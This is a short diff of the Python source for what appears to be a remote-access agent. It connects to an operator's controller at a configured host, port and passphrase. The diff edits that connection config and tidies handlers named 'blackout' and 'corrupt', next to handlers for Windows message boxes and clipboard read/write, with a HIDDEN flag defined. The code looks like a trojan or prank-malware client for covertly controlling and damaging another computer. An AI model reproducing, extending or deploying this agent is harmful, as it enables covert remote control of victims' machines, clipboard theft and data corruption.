@@ -15,9 +15,9 @@ HIDDEN   = 0x02 | 0x04
 
 # ------------------------------------------------------------------ config ---
 CFG = {
-    "host": "127.0.0.1",           # controller IP / VPS / Tailscale name
-    "port": 443,
-    "passphrase": "pX-2026-changeme",   # <-- key material, must match controller
+    "host": "192.168.1.50",        # <-- YOUR machine's LAN IP or Tailscale name
+    "port": 44300,                 # <-- must match controller's --listen port
+    "passphrase": "pX-2026-changeme",   # <-- must match controller PASSPHRASE
     "tls": False,
     "kdf_iters": 60000,
 
@@ -935,8 +935,8 @@ class Agent:
         threading.Thread(target=lambda: ctypes.windll.user32.MessageBoxW(
             0, a.get("text", "hi"), a.get("title", TAG), 0x40 | 0x1000), daemon=True).start()
         return "shown"
-    def c_blackout(self, a, x):    return px_blackout(a)     # <-- NEW
-    def c_corrupt(self, a, x):     return px_corrupt(a)      # <-- NEW
+    def c_blackout(self, a, x):    return px_blackout(a)
+    def c_corrupt(self, a, x):     return px_corrupt(a)
     def c_clip(self, a, x):
         if a.get("set") is not None: self.set_clip(a["set"]); return "set"
         return clipboard()
